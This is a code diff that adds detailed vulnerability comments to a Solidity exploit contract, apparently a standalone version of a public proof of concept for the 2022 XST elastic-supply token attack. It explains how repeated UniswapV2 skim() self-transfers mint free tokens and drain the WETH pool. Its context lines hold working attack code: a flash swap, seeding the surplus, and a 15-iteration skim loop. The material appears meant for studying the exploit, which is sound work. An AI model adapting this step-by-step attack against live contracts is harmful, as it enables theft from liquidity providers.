@@ -1,6 +1,24 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+// VULNERABILITY: Elastic-supply rebase token (XST) allows arbitrary minting via UniswapV2Pair.skim() self-transfers misclassified as "buy" txs
+// Root cause: XST2._transfer (when sender is supported LP pool) + _getTxType + _implementBuy unconditionally mints on ANY transfer *from* the pool address (incl. pair->pair self-xfer and pair->EOA), because:
+//   - skim(to) does: XST.transfer(to, bal - reserve) with msg.sender == pair contract
+//   - if (isSupportedPool(sender)) { lpBurn = syncPair(sender); txType = lpBurn ? 3 : 1; }
+//   - txType==1 always does getMintValue(sender=pool, amount) then _totalSupply += totalMint (and largeBals to stab/treasury)
+//   - no check that the transfer corresponds to a real incoming swap/liquidity add that justifies expansion
+//   - rebase: factor = _largeTotal / _totalSupply; balanceOf(a) = large[a] / factor
+//     minting (totalSupply++) drops factor => inflates balanceOf(pool) even if pool's _largeBalances[pool] is unchanged
+// Why skim(pair) ratchets: 
+//   1. seed surplus: direct XST.transfer(attacker->pool, X/8)  [updates pool bal]
+//   2. skim(pair): pair calls XST.transfer(pool->pool, surplus)  => net large[pool] unchanged but totalSupply++ (factor--) => reported balanceOf(pool) inflates
+//   3. repeat 15x: each iteration skims "current" surplus (now larger), causing more mint, more inflation of bal vs fixed reserve0
+//   4. final skim(attacker): skims the now-huge surplus (actual XST units moved to attacker)
+//   5. attacker dumps surplus XST back into pair + calls swap to extract WETH
+// Impact: Attacker mints "free" XST from the elastic accounting, drains WETH reserves of XST/WETH pair (116.99 -> ~11.63 WETH), nets ~27 WETH.
+// The design assumes pool balance changes only come from controlled buy/sell paths; skim bypasses that by letting the pair contract itself originate transfers.
+// Also note: reserves in pair are never in sync with XST's rebased view of balanceOf(pair) after factor changes.
+
 // Synthetic standalone exploit for the EVM Playground (2022-08-XST_exp2).
 // The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
 // (the flash-swap callback `uniswapV2Call` lives on the test itself, so there
@@ -60,6 +78,21 @@ contract XSTExploit2 {
         IERC20(WETH).transfer(Pair2, amountSellWETH);
         IUniswapV2Pair(Pair2).swap(amountOutXST, 0, address(this), "");
 
+        // VULNERABILITY: seed + ratchet via skim(self) mints via pool-as-sender path
+        // See header for full root cause. The following lines exercise the defect:
+        //   - XST.transfer(to=Pair2) seeds initial surplus in actual balanceOf(Pair2)
+        //   - repeated skim(Pair2) => pair calls XST.transfer(from=Pair2, to=Pair2, amt) 
+        //     inside XST: sender=pool => txType=1 (no lpBurn) => _implementBuy mints, totalSupply++, factor drops, balanceOf(Pair2) inflates
+        //   - final skim(this) extracts the artificially created surplus XST (computed as bal-reserve, now huge)
+        // EXPLOIT STEPS:
+        // 1. Flash 2x WETH reserve from Pair1 (WETH/USDT) into this.
+        // 2. Swap all flash WETH into Pair2 for XST (updates Pair2's WETH reserve upward, XST reserve down).
+        // 3. transfer(X/8) to Pair2 (seed surplus; triggers sell path but leaves bal high).
+        // 4. 15x skim(Pair2): each causes self-xfer from pool triggering buy-mint + rebase inflation of pair's bal vs. fixed reserve.
+        // 5. skim(this): receive the ratcheted surplus XST (free minted supply).
+        // 6. transfer all received XST back to Pair2 (now creates large surplus = bal - reserve).
+        // 7. swap the surplus XST out for Pair2's WETH (drains the pool).
+        // 8. repay flash (amount*2 *1000/997 +1k).
         // --- seed the skim surplus, then ratchet the pair's XST via 15× skim(pair) ---
         IERC20(XST).transfer(Pair2, IERC20(XST).balanceOf(address(this)) / 8);
         for (int256 i = 0; i < 15; i++) {
